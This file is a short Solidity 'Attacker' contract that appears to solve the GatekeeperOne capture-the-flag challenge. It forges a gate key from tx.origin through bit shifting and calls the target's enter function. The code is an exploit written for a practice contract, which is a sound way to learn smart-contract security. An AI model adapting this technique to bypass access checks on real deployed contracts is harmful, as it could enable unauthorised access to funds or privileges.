pragma solidity ^0.8.0;

import "./GatekeeperOne.sol";

contract Attacker {
    GatekeeperOne gatekeeper;

    constructor(address _gatekeeperAddress) {
        gatekeeper = GatekeeperOne(_gatekeeperAddress);
    }

    function attack() public payable {
        bytes8 addrKey = bytes8(uint64(uint160(tx.origin)));
        //console.logBytes8(addrKey);
        addrKey = addrKey << 48;
        addrKey = addrKey >> 48;
        addrKey = bytes8(uint64(addrKey) + 2 ** 32);
        //console.logBytes8(addrKey);
       gatekeeper.enter(addrKey);
    }
}